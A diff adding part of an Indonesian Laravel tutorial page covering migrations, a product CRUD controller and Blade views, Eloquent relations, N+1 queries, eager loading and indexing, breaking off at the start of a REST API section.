+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:migration create_produks_table</code></pre>
+      <div class="pre-label">database/migrations/..._create_produks_table.php</div>
+      <pre><code><span class="kw">public function</span> <span class="fn">up</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">create</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">id</span>();
+        $table-&gt;<span class="fn">string</span>(<span class="str">'nama_produk'</span>);
+        $table-&gt;<span class="fn">integer</span>(<span class="str">'harga'</span>);
+        $table-&gt;<span class="fn">integer</span>(<span class="str">'stok'</span>);
+        $table-&gt;<span class="fn">timestamps</span>();
+    });
+}
+<span class="kw">public function</span> <span class="fn">down</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">dropIfExists</span>(<span class="str">'produks'</span>);
+}</code></pre>
+
+      <h3>Migration 2 &mdash; Tambah Kolom Deskripsi</h3>
+      <p>Jika perlu menambah kolom ke tabel yang sudah ada, buat migration baru &mdash;
+        jangan edit migration lama yang sudah dijalankan.</p>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:migration add_deskripsi_to_produks_table</code></pre>
+      <div class="pre-label">database/migrations/..._add_deskripsi_to_produks_table.php</div>
+      <pre><code><span class="kw">public function</span> <span class="fn">up</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">table</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">text</span>(<span class="str">'deskripsi'</span>)-&gt;<span class="fn">nullable</span>()-&gt;<span class="fn">after</span>(<span class="str">'stok'</span>);
+    });
+}
+<span class="kw">public function</span> <span class="fn">down</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">table</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">dropColumn</span>(<span class="str">'deskripsi'</span>);
+    });
+}</code></pre>
+
+      <h3>Jalankan Migration</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan migrate           <span class="cm"># jalankan semua yang belum dijalankan</span>
+php artisan migrate:rollback  <span class="cm"># batalkan migration terakhir</span>
+php artisan migrate:fresh     <span class="cm"># reset dan jalankan ulang semua</span></code></pre>
+      <div class="callout">
+        <div class="callout-title">Struktur Tabel Akhir</div>
+        <code>id</code>, <code>nama_produk</code>, <code>harga</code>, <code>stok</code>,
+        <code>deskripsi</code> (nullable), <code>created_at</code>, <code>updated_at</code>
+      </div>
+    </div>
+
+    <!-- MODEL -->
+    <div class="section" id="crud-model">
+      <h2>Model Produk</h2>
+      <p>Model adalah representasi tabel database dalam PHP class. Eloquent ORM memudahkan
+        interaksi dengan database tanpa menulis SQL manual.</p>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:model Produk</code></pre>
+      <div class="pre-label">app/Models/Produk.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">namespace</span> App\Models;
+<span class="kw">use</span> Illuminate\Database\Eloquent\Model;
+
+<span class="kw">class</span> <span class="cl">Produk</span> <span class="kw">extends</span> <span class="cl">Model</span>
+{
+    <span class="kw">protected</span> $fillable = [
+        <span class="str">'nama_produk'</span>, <span class="str">'harga'</span>, <span class="str">'stok'</span>, <span class="str">'deskripsi'</span>,
+    ];
+}</code></pre>
+      <div class="callout warning">
+        <div class="callout-title">Mengapa <code>$fillable</code> Penting?</div>
+        Melindungi dari <strong>mass assignment vulnerability</strong> &mdash; hanya kolom
+        yang terdaftar di <code>$fillable</code> yang bisa diisi via <code>create()</code>
+        atau <code>update()</code>. Tanpa ini, penyerang bisa menyuntikkan field berbahaya
+        seperti <code>is_admin=true</code>.
+      </div>
+
+      <h3>Konvensi Penamaan Eloquent</h3>
+      <table>
+        <thead><tr><th>Hal</th><th>Konvensi</th><th>Contoh</th></tr></thead>
+        <tbody>
+          <tr><td>Nama class</td><td>PascalCase, singular</td><td><code>Produk</code></td></tr>
+          <tr><td>Nama tabel</td><td>snake_case, plural (otomatis)</td><td><code>produks</code></td></tr>
+          <tr><td>Primary key</td><td><code>id</code> (otomatis)</td><td><code>id</code></td></tr>
+          <tr><td>Timestamps</td><td><code>created_at</code>, <code>updated_at</code> (otomatis)</td><td>&mdash;</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- CONTROLLER -->
+    <div class="section" id="crud-controller">
+      <h2>Resource Controller</h2>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:controller ProdukController --resource</code></pre>
+      <div class="pre-label">app/Http/Controllers/ProdukController.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">namespace</span> App\Http\Controllers;
+<span class="kw">use</span> App\Models\Produk;
+<span class="kw">use</span> Illuminate\Http\Request;
+
+<span class="kw">class</span> <span class="cl">ProdukController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="cm">// GET /produk &mdash; tampilkan semua produk</span>
+    <span class="kw">public function</span> <span class="fn">index</span>()
+    {
+        $produks = <span class="cl">Produk</span>::<span class="fn">all</span>();
+        <span class="kw">return</span> <span class="fn">view</span>(<span class="str">'produk.index'</span>, <span class="fn">compact</span>(<span class="str">'produks'</span>));
+    }
+
+    <span class="cm">// GET /produk/create &mdash; tampilkan form tambah</span>
+    <span class="kw">public function</span> <span class="fn">create</span>()
+    {
+        <span class="kw">return</span> <span class="fn">view</span>(<span class="str">'produk.create'</span>);
+    }
+
+    <span class="cm">// POST /produk &mdash; simpan produk baru</span>
+    <span class="kw">public function</span> <span class="fn">store</span>(<span class="cl">Request</span> $request)
+    {
+        $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'nama_produk'</span> =&gt; <span class="str">'required'</span>,
+            <span class="str">'harga'</span>       =&gt; <span class="str">'required|numeric|min:1'</span>,
+            <span class="str">'stok'</span>        =&gt; <span class="str">'required|numeric|min:0'</span>,
+            <span class="str">'deskripsi'</span>   =&gt; <span class="str">'nullable|max:500'</span>,
+        ]);
+        <span class="cl">Produk</span>::<span class="fn">create</span>($request-&gt;<span class="fn">all</span>());
+        <span class="kw">return</span> <span class="fn">redirect</span>()-&gt;<span class="fn">route</span>(<span class="str">'produk.index'</span>)
+            -&gt;<span class="fn">with</span>(<span class="str">'success'</span>, <span class="str">'Produk berhasil ditambahkan.'</span>);
+    }
+
+    <span class="cm">// GET /produk/{id}/edit &mdash; form edit</span>
+    <span class="kw">public function</span> <span class="fn">edit</span>(<span class="cl">Produk</span> $produk)
+    {
+        <span class="kw">return</span> <span class="fn">view</span>(<span class="str">'produk.edit'</span>, <span class="fn">compact</span>(<span class="str">'produk'</span>));
+    }
+
+    <span class="cm">// PUT /produk/{id} &mdash; update produk</span>
+    <span class="kw">public function</span> <span class="fn">update</span>(<span class="cl">Request</span> $request, <span class="cl">Produk</span> $produk)
+    {
+        $request-&gt;<span class="fn">validate</span>([
+            <span class="str">'nama_produk'</span> =&gt; <span class="str">'required'</span>,
+            <span class="str">'harga'</span>       =&gt; <span class="str">'required|numeric|min:1'</span>,
+            <span class="str">'stok'</span>        =&gt; <span class="str">'required|numeric|min:0'</span>,
+            <span class="str">'deskripsi'</span>   =&gt; <span class="str">'nullable|max:500'</span>,
+        ]);
+        $produk-&gt;<span class="fn">update</span>($request-&gt;<span class="fn">all</span>());
+        <span class="kw">return</span> <span class="fn">redirect</span>()-&gt;<span class="fn">route</span>(<span class="str">'produk.index'</span>)
+            -&gt;<span class="fn">with</span>(<span class="str">'success'</span>, <span class="str">'Produk berhasil diperbarui.'</span>);
+    }
+
+    <span class="cm">// DELETE /produk/{id} &mdash; hapus produk</span>
+    <span class="kw">public function</span> <span class="fn">destroy</span>(<span class="cl">Produk</span> $produk)
+    {
+        $produk-&gt;<span class="fn">delete</span>();
+        <span class="kw">return</span> <span class="fn">redirect</span>()-&gt;<span class="fn">route</span>(<span class="str">'produk.index'</span>)
+            -&gt;<span class="fn">with</span>(<span class="str">'success'</span>, <span class="str">'Produk berhasil dihapus.'</span>);
+    }
+}</code></pre>
+      <div class="callout">
+        <div class="callout-title">Route Model Binding</div>
+        Parameter <code>Produk $produk</code> di <code>edit</code>, <code>update</code>, <code>destroy</code>
+        &mdash; Laravel otomatis mencari record dari <code>{id}</code> di URL.
+        Jika tidak ditemukan, Laravel otomatis mengembalikan 404.
+      </div>
+    </div>
+
+    <!-- VIEWS -->
+    <div class="section" id="crud-views">
+      <h2>Views (Blade Templates)</h2>
+      <p>Buat folder <code>resources/views/produk/</code> dengan tiga file berikut.</p>
+
+      <h3>index.blade.php &mdash; Daftar Produk</h3>
+      <div class="pre-label">resources/views/produk/index.blade.php</div>
+      <pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body class="container mt-5"&gt;
+  &lt;h2&gt;Daftar Produk&lt;/h2&gt;
+  &lt;a href="{{ route('produk.create') }}" class="btn btn-primary mb-3"&gt;Tambah Produk&lt;/a&gt;
+
+  @if ($message = Session::get('success'))
+    &lt;div class="alert alert-success"&gt;{{ $message }}&lt;/div&gt;
+  @endif
+
+  &lt;table class="table table-bordered"&gt;
+    &lt;tr&gt;&lt;th&gt;Nama&lt;/th&gt;&lt;th&gt;Harga&lt;/th&gt;&lt;th&gt;Stok&lt;/th&gt;&lt;th&gt;Aksi&lt;/th&gt;&lt;/tr&gt;
+    @foreach ($produks as $p)
+    &lt;tr&gt;
+      &lt;td&gt;{{ $p-&gt;nama_produk }}&lt;/td&gt;
+      &lt;td&gt;{{ $p-&gt;harga }}&lt;/td&gt;
+      &lt;td&gt;{{ $p-&gt;stok }}&lt;/td&gt;
+      &lt;td&gt;
+        &lt;a class="btn btn-warning" href="{{ route('produk.edit', $p-&gt;id) }}"&gt;Edit&lt;/a&gt;
+        &lt;form action="{{ route('produk.destroy', $p-&gt;id) }}" method="POST" style="display:inline"&gt;
+          @csrf @method('DELETE')
+          &lt;button class="btn btn-danger"
+                  onclick="return confirm('Yakin hapus?')"&gt;Hapus&lt;/button&gt;
+        &lt;/form&gt;
+      &lt;/td&gt;
+    &lt;/tr&gt;
+    @endforeach
+  &lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+      <h3>create.blade.php &mdash; Form Tambah</h3>
+      <div class="pre-label">resources/views/produk/create.blade.php</div>
+      <pre><code>&lt;form action="{{ route('produk.store') }}" method="POST"&gt;
+  @if ($errors-&gt;any())
+    &lt;div class="alert alert-danger"&gt;&lt;ul&gt;
+      @foreach ($errors-&gt;all() as $error)
+        &lt;li&gt;{{ $error }}&lt;/li&gt;
+      @endforeach
+    &lt;/ul&gt;&lt;/div&gt;
+  @endif
+  @csrf
+  &lt;div class="mb-3"&gt;&lt;label&gt;Nama Produk&lt;/label&gt;
+    &lt;input type="text" name="nama_produk" class="form-control"
+           value="{{ old('nama_produk') }}" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Harga&lt;/label&gt;
+    &lt;input type="number" name="harga" class="form-control"
+           value="{{ old('harga') }}" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Stok&lt;/label&gt;
+    &lt;input type="number" name="stok" class="form-control"
+           value="{{ old('stok') }}" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Deskripsi&lt;/label&gt;
+    &lt;textarea name="deskripsi" class="form-control" rows="3"&gt;{{ old('deskripsi') }}&lt;/textarea&gt;
+    @error('deskripsi') &lt;div class="text-danger"&gt;{{ $message }}&lt;/div&gt; @enderror
+  &lt;/div&gt;
+  &lt;button type="submit" class="btn btn-success"&gt;Simpan&lt;/button&gt;
+  &lt;a href="{{ route('produk.index') }}" class="btn btn-secondary"&gt;Kembali&lt;/a&gt;
+&lt;/form&gt;</code></pre>
+
+      <h3>edit.blade.php &mdash; Form Edit</h3>
+      <div class="pre-label">resources/views/produk/edit.blade.php</div>
+      <pre><code>&lt;form action="{{ route('produk.update', $produk-&gt;id) }}" method="POST"&gt;
+  @csrf @method('PUT')
+  &lt;div class="mb-3"&gt;&lt;label&gt;Nama Produk&lt;/label&gt;
+    &lt;input type="text" name="nama_produk"
+           value="{{ $produk-&gt;nama_produk }}" class="form-control" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Harga&lt;/label&gt;
+    &lt;input type="number" name="harga"
+           value="{{ $produk-&gt;harga }}" class="form-control" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Stok&lt;/label&gt;
+    &lt;input type="number" name="stok"
+           value="{{ $produk-&gt;stok }}" class="form-control" required&gt;&lt;/div&gt;
+  &lt;div class="mb-3"&gt;&lt;label&gt;Deskripsi&lt;/label&gt;
+    &lt;textarea name="deskripsi" class="form-control" rows="3"&gt;{{ old('deskripsi', $produk-&gt;deskripsi) }}&lt;/textarea&gt;
+    @error('deskripsi') &lt;div class="text-danger"&gt;{{ $message }}&lt;/div&gt; @enderror
+  &lt;/div&gt;
+  &lt;button type="submit" class="btn btn-primary"&gt;Update&lt;/button&gt;
+  &lt;a href="{{ route('produk.index') }}" class="btn btn-secondary"&gt;Kembali&lt;/a&gt;
+&lt;/form&gt;</code></pre>
+
+      <h3>Poin Penting Blade</h3>
+      <table>
+        <thead><tr><th>Syntax</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td><code>@csrf</code></td><td>Sisipkan hidden CSRF token (wajib di semua form POST)</td></tr>
+          <tr><td><code>@method('DELETE')</code></td><td>Spoofing HTTP method (browser hanya kenal GET/POST)</td></tr>
+          <tr><td><code>{{ old('field') }}</code></td><td>Isi ulang nilai field setelah validasi gagal</td></tr>
+          <tr><td><code>{{ old('field', $model->field) }}</code></td><td>Default dari model untuk form edit</td></tr>
+          <tr><td><code>@error('f')...@enderror</code></td><td>Tampilkan pesan error validasi per field</td></tr>
+          <tr><td><code>{{ $var }}</code></td><td>Output dengan auto-escape XSS (aman)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ROUTES CRUD -->
+    <div class="section" id="crud-routes">
+      <h2>Routes Web (CRUD)</h2>
+      <div class="pre-label">routes/web.php</div>
+      <pre><code><span class="op">&lt;?php</span>
+<span class="kw">use</span> App\Http\Controllers\ProdukController;
+<span class="kw">use</span> Illuminate\Support\Facades\Route;
+
+<span class="cl">Route</span>::<span class="fn">get</span>(<span class="str">'/'</span>, fn() =&gt; <span class="fn">redirect</span>()-&gt;<span class="fn">route</span>(<span class="str">'produk.index'</span>));
+<span class="cl">Route</span>::<span class="fn">resource</span>(<span class="str">'produk'</span>, <span class="cl">ProdukController</span>::class);</code></pre>
+
+      <p><code>Route::resource()</code> otomatis membuat 6 route sekaligus:</p>
+      <table>
+        <thead><tr><th>Method</th><th>URL</th><th>Route Name</th><th>Controller</th></tr></thead>
+        <tbody>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/produk</code></td><td><code>produk.index</code></td><td><code>index()</code></td></tr>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/produk/create</code></td><td><code>produk.create</code></td><td><code>create()</code></td></tr>
+          <tr><td><span class="badge badge-green">POST</span></td><td><code>/produk</code></td><td><code>produk.store</code></td><td><code>store()</code></td></tr>
+          <tr><td><span class="badge badge-blue">GET</span></td><td><code>/produk/{id}/edit</code></td><td><code>produk.edit</code></td><td><code>edit()</code></td></tr>
+          <tr><td><span class="badge badge-yellow">PUT</span></td><td><code>/produk/{id}</code></td><td><code>produk.update</code></td><td><code>update()</code></td></tr>
+          <tr><td><span class="badge badge-red">DELETE</span></td><td><code>/produk/{id}</code></td><td><code>produk.destroy</code></td><td><code>destroy()</code></td></tr>
+        </tbody>
+      </table>
+      <div class="callout">
+        <div class="callout-title">Cek Semua Route</div>
+        <code>php artisan route:list</code> &mdash; tampilkan daftar lengkap semua route beserta middleware-nya.
+      </div>
+    </div>
+
+    <hr class="divider" />
+
+    <!-- ========== ELOQUENT & RELASI ========== -->
+    <div class="section" id="eloquent-dasar">
+      <h2>Query Dasar Eloquent</h2>
+      <p>
+        <strong>Eloquent</strong> adalah ORM (Object-Relational Mapping) bawaan Laravel.
+        Selain <code>create()</code>, <code>update()</code>, dan <code>delete()</code> yang
+        sudah dipakai di CRUD Produk, berikut method query yang paling sering dibutuhkan.
+      </p>
+      <table>
+        <thead><tr><th>Method</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td><code>Produk::all()</code></td><td>Ambil semua record</td></tr>
+          <tr><td><code>Produk::find($id)</code></td><td>Ambil satu record by primary key, <code>null</code> jika tidak ada</td></tr>
+          <tr><td><code>Produk::findOrFail($id)</code></td><td>Sama seperti <code>find()</code>, tapi lempar 404 jika tidak ada</td></tr>
+          <tr><td><code>Produk::where('stok', '&gt;', 0)-&gt;get()</code></td><td>Filter dengan kondisi</td></tr>
+          <tr><td><code>Produk::orderBy('harga', 'desc')-&gt;first()</code></td><td>Urutkan lalu ambil satu teratas</td></tr>
+          <tr><td><code>Produk::where('nama_produk', 'like', "%$q%")-&gt;paginate(10)</code></td><td>Pencarian + pagination</td></tr>
+        </tbody>
+      </table>
+      <div class="callout warning">
+        <div class="callout-title">Query Builder Malas (Lazy)</div>
+        Eloquent query baru benar-benar dijalankan ke database saat dipanggil method eksekusi
+        seperti <code>get()</code>, <code>first()</code>, <code>find()</code>, atau <code>count()</code>.
+        Sebelum itu, <code>where()</code> hanya menyusun query di memori.
+      </div>
+    </div>
+
+    <div class="section" id="eloquent-relasi">
+      <h2>Relasi Antar Model</h2>
+      <p>
+        Aplikasi nyata jarang punya satu tabel berdiri sendiri. Misalnya setiap
+        <code>Produk</code> punya satu <code>Kategori</code>. Eloquent merepresentasikan
+        relasi ini sebagai method di dalam model, bukan JOIN manual.
+      </p>
+
+      <h3>Migration Tabel Kategori &amp; Foreign Key</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:migration create_kategoris_table
+php artisan make:migration add_kategori_id_to_produks_table</code></pre>
+      <div class="pre-label">database/migrations/..._add_kategori_id_to_produks_table.php</div>
+      <pre><code><span class="kw">public function</span> <span class="fn">up</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">table</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">foreignId</span>(<span class="str">'kategori_id'</span>)
+              -&gt;<span class="fn">nullable</span>()
+              -&gt;<span class="fn">constrained</span>()
+              -&gt;<span class="fn">nullOnDelete</span>();   <span class="cm">// kategori dihapus → produk tidak ikut terhapus</span>
+    });
+}</code></pre>
+
+      <h3>Model &mdash; <code>belongsTo</code> &amp; <code>hasMany</code></h3>
+      <div class="pre-label">app/Models/Produk.php</div>
+      <pre><code><span class="kw">class</span> <span class="cl">Produk</span> <span class="kw">extends</span> <span class="cl">Model</span>
+{
+    <span class="kw">protected</span> $fillable = [<span class="str">'nama_produk'</span>, <span class="str">'harga'</span>, <span class="str">'stok'</span>, <span class="str">'deskripsi'</span>, <span class="str">'kategori_id'</span>];
+
+    <span class="cm">// Satu produk milik satu kategori</span>
+    <span class="kw">public function</span> <span class="fn">kategori</span>()
+    {
+        <span class="kw">return</span> $this-&gt;<span class="fn">belongsTo</span>(<span class="cl">Kategori</span>::class);
+    }
+}</code></pre>
+      <div class="pre-label">app/Models/Kategori.php</div>
+      <pre><code><span class="kw">class</span> <span class="cl">Kategori</span> <span class="kw">extends</span> <span class="cl">Model</span>
+{
+    <span class="kw">protected</span> $fillable = [<span class="str">'nama_kategori'</span>];
+
+    <span class="cm">// Satu kategori punya banyak produk</span>
+    <span class="kw">public function</span> <span class="fn">produks</span>()
+    {
+        <span class="kw">return</span> $this-&gt;<span class="fn">hasMany</span>(<span class="cl">Produk</span>::class);
+    }
+}</code></pre>
+
+      <h3>Memakai Relasi</h3>
+      <pre><code><span class="cm">// Akses seperti property biasa — Eloquent yang jalankan query di belakang layar</span>
+$produk = <span class="cl">Produk</span>::<span class="fn">find</span>(<span class="nb">1</span>);
+<span class="fn">echo</span> $produk-&gt;kategori-&gt;nama_kategori;
+
+<span class="cm">// Kebalikannya — semua produk milik satu kategori</span>
+$kategori = <span class="cl">Kategori</span>::<span class="fn">find</span>(<span class="nb">1</span>);
+<span class="fn">foreach</span> ($kategori-&gt;produks <span class="kw">as</span> $p) {
+    <span class="fn">echo</span> $p-&gt;nama_produk;
+}</code></pre>
+
+      <table>
+        <thead><tr><th>Relasi</th><th>Contoh</th><th>Kapan Dipakai</th></tr></thead>
+        <tbody>
+          <tr><td><code>belongsTo</code></td><td>Produk &rarr; Kategori</td><td>Tabel ini punya foreign key ke tabel lain</td></tr>
+          <tr><td><code>hasMany</code></td><td>Kategori &rarr; Produk</td><td>Tabel lain punya foreign key ke tabel ini</td></tr>
+          <tr><td><code>hasOne</code></td><td>User &rarr; Profile</td><td>Relasi satu-ke-satu</td></tr>
+          <tr><td><code>belongsToMany</code></td><td>Produk &harr; Tag</td><td>Relasi banyak-ke-banyak (butuh tabel pivot)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ========== QUERY OPTIMIZATION ========== -->
+    <div class="section" id="n-plus-one">
+      <h2>Masalah N+1 Query</h2>
+      <p>
+        <strong>N+1 query</strong> terjadi saat kode menjalankan 1 query untuk ambil data utama,
+        lalu 1 query tambahan <em>per baris</em> untuk ambil data relasinya &mdash; total N+1 query
+        padahal cukup 2.
+      </p>
+
+      <div class="pre-label">app/Http/Controllers/Api/ProdukApiController.php &mdash; Bermasalah</div>
+      <pre><code><span class="kw">public function</span> <span class="fn">index</span>()
+{
+    $produks = <span class="cl">Produk</span>::<span class="fn">all</span>();   <span class="cm">// 1 query</span>
+
+    <span class="kw">return</span> <span class="fn">view</span>(<span class="str">'produk.index'</span>, [
+        <span class="str">'produks'</span> =&gt; $produks,
+    ]);
+}</code></pre>
+      <div class="pre-label">resources/views/produk/index.blade.php</div>
+      <pre><code>@foreach ($produks as $p)
+  {{ $p-&gt;nama_produk }} - {{ $p-&gt;kategori-&gt;nama_kategori }}
+  <span class="cm">{{-- setiap $p->kategori di sini memicu 1 query baru --}}</span>
+@endforeach</code></pre>
+      <div class="callout danger">
+        <div class="callout-title">100 Produk = 101 Query</div>
+        1 query untuk <code>Produk::all()</code>, ditambah 100 query terpisah &mdash; satu untuk
+        setiap <code>$p-&gt;kategori</code> yang diakses di dalam loop. Semakin banyak data,
+        semakin lambat halaman dimuat.
+      </div>
+
+      <h3>Mendeteksi N+1</h3>
+      <p>
+        Aktifkan query log sementara untuk melihat berapa banyak query yang benar-benar
+        dijalankan, atau pakai package <code>barryvdh/laravel-debugbar</code> saat development.
+      </p>
+      <div class="pre-label">Tinker / kode sementara</div>
+      <pre><code><span class="cl">DB</span>::<span class="fn">listen</span>(<span class="kw">function</span> ($query) {
+    <span class="fn">logger</span>($query-&gt;sql, $query-&gt;bindings);
+});</code></pre>
+    </div>
+
+    <div class="section" id="eager-loading">
+      <h2>Eager Loading</h2>
+      <p>
+        Solusinya: beri tahu Eloquent di awal relasi apa saja yang akan dipakai, dengan
+        <code>with()</code>. Laravel akan menggabungkannya menjadi query tambahan yang jumlahnya
+        tetap (tidak tergantung jumlah baris).
+      </p>
+      <div class="pre-label">app/Http/Controllers/Api/ProdukApiController.php &mdash; Diperbaiki</div>
+      <pre><code><span class="kw">public function</span> <span class="fn">index</span>()
+{
+    <span class="cm">// 2 query total: 1 untuk produk, 1 untuk semua kategori terkait</span>
+    $produks = <span class="cl">Produk</span>::<span class="fn">with</span>(<span class="str">'kategori'</span>)-&gt;<span class="fn">get</span>();
+
+    <span class="kw">return</span> <span class="fn">response</span>()-&gt;<span class="fn">json</span>([<span class="str">'success'</span> =&gt; <span class="kw">true</span>, <span class="str">'data'</span> =&gt; $produks]);
+}
+
+<span class="cm">// Beberapa relasi sekaligus</span>
+$produks = <span class="cl">Produk</span>::<span class="fn">with</span>([<span class="str">'kategori'</span>, <span class="str">'ulasan'</span>])-&gt;<span class="fn">get</span>();
+
+<span class="cm">// Nested — relasi dari relasi</span>
+$produks = <span class="cl">Produk</span>::<span class="fn">with</span>(<span class="str">'kategori.produks'</span>)-&gt;<span class="fn">get</span>();</code></pre>
+
+      <table>
+        <thead><tr><th>Teknik</th><th>Kapan Dipakai</th></tr></thead>
+        <tbody>
+          <tr><td><code>with('relasi')</code></td><td>Eager load standar &mdash; hampir selalu dipakai relasi ini</td></tr>
+          <tr><td><code>load('relasi')</code></td><td>Eager load setelah data sudah diambil (lazy eager loading)</td></tr>
+          <tr><td><code>withCount('relasi')</code></td><td>Hitung jumlah relasi tanpa memuat semua datanya, misal <code>$kategori-&gt;produks_count</code></td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout success">
+        <div class="callout-title">Aturan Praktis</div>
+        Setiap kali kamu mengakses relasi di dalam <code>@foreach</code> / <code>foreach</code>,
+        cek dulu apakah relasi tersebut sudah di-eager-load dengan <code>with()</code>
+        di query awal.
+      </div>
+    </div>
+
+    <div class="section" id="indexing">
+      <h2>Indexing Dasar</h2>
+      <p>
+        <strong>Index</strong> adalah struktur data tambahan yang mempercepat pencarian baris
+        tanpa harus memindai seluruh tabel (<em>full table scan</em>). Trade-off-nya: index
+        mempercepat <code>SELECT</code> tapi sedikit memperlambat <code>INSERT</code>/<code>UPDATE</code>
+        karena index juga harus diperbarui.
+
+      </p>
+
+      <h3>Kolom yang Sebaiknya Diberi Index</h3>
+      <ul>
+        <li>Foreign key &mdash; contoh <code>kategori_id</code> (Laravel otomatis meng-index-nya lewat <code>foreignId()-&gt;constrained()</code>)</li>
+        <li>Kolom yang sering dipakai di <code>WHERE</code>, misal <code>email</code>, <code>status</code></li>
+        <li>Kolom yang sering dipakai di <code>ORDER BY</code>, misal <code>created_at</code></li>
+        <li>Kolom unik seperti <code>email</code> pada tabel <code>users</code></li>
+      </ul>
+
+      <div class="pre-label">database/migrations/..._create_produks_table.php</div>
+      <pre><code><span class="cl">Schema</span>::<span class="fn">create</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+    $table-&gt;<span class="fn">id</span>();
+    $table-&gt;<span class="fn">string</span>(<span class="str">'nama_produk'</span>);
+    $table-&gt;<span class="fn">integer</span>(<span class="str">'harga'</span>);
+    $table-&gt;<span class="fn">integer</span>(<span class="str">'stok'</span>);
+    $table-&gt;<span class="fn">string</span>(<span class="str">'status'</span>)-&gt;<span class="fn">default</span>(<span class="str">'aktif'</span>)-&gt;<span class="fn">index</span>();   <span class="cm">// single-column index</span>
+    $table-&gt;<span class="fn">timestamps</span>();
+
+    <span class="cm">// composite index — untuk query yang filter dua kolom sekaligus</span>
+    $table-&gt;<span class="fn">index</span>([<span class="str">'kategori_id'</span>, <span class="str">'status'</span>]);
+});</code></pre>
+
+      <h3>Menambah Index ke Tabel yang Sudah Ada</h3>
+      <div class="pre-label">Terminal</div>
+      <pre><code>php artisan make:migration add_index_to_produks_table</code></pre>
+      <pre><code><span class="kw">public function</span> <span class="fn">up</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">table</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">index</span>(<span class="str">'nama_produk'</span>);
+    });
+}
+<span class="kw">public function</span> <span class="fn">down</span>(): <span class="kw">void</span>
+{
+    <span class="cl">Schema</span>::<span class="fn">table</span>(<span class="str">'produks'</span>, <span class="kw">function</span> (<span class="cl">Blueprint</span> $table) {
+        $table-&gt;<span class="fn">dropIndex</span>([<span class="str">'nama_produk'</span>]);
+    });
+}</code></pre>
+
+      <h3>Cek Query Lambat dengan EXPLAIN</h3>
+      <div class="pre-label">Tinker</div>
+      <pre><code><span class="cl">DB</span>::<span class="fn">select</span>(<span class="str">'EXPLAIN SELECT * FROM produks WHERE status = ?'</span>, [<span class="str">'aktif'</span>]);
+<span class="cm">// perhatikan kolom "key" pada hasil — jika NULL, index tidak dipakai</span></code></pre>
+
+      <div class="callout warning">
+        <div class="callout-title">Jangan Asal Index Semua Kolom</div>
+        Index yang berlebihan memperlambat proses tulis (insert/update) dan menambah ukuran
+        database. Tambahkan index hanya pada kolom yang benar-benar sering di-<code>WHERE</code>,
+        <code>ORDER BY</code>, atau dijadikan foreign key.
+      </div>
+    </div>
+
+    <hr class="divider" />
+
+    <!-- ========== REST API ========== -->
+    <div class="section" id="pengenalan">
+      <h2>Pengenalan REST API</h2>
+      <p><strong>REST API</strong> (Representational State Transfer Application Programming Interface)
+        memungkinkan aplikasi yang berbeda saling berkomunikasi melalui HTTP. Server hanya mengembalikan
+        data (biasanya JSON), bukan HTML.</p>
+
+      <table>
+        <thead><tr><th>Web Tradisional</th><th>REST API</th></tr></thead>
+        <tbody>
+          <tr><td>Server kirim HTML lengkap</td><td>Server kirim data JSON saja</td></tr>
+          <tr><td>Browser render tampilan</td><td>Client (app/frontend) render tampilan</td></tr>
+          <tr><td>Satu platform (web)</td><td>Multi-platform (web, mobile, IoT)</td></tr>
+          <tr><td>Session &amp; cookie auth</td><td>Token-based auth (Sanctum, JWT)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Format Response JSON</h3>
+      <pre><code>{
+  <span class="str">"success"</span>: <span class="kw">true</span>,
+  <span class="str">"data"</span>: [
+    { <span class="str">"id"</span>: 1, <span class="str">"nama_produk"</span>: <span class="str">"Laptop"</span>, <span class="str">"harga"</span>: 8000000, <span class="str">"stok"</span>: 10 },
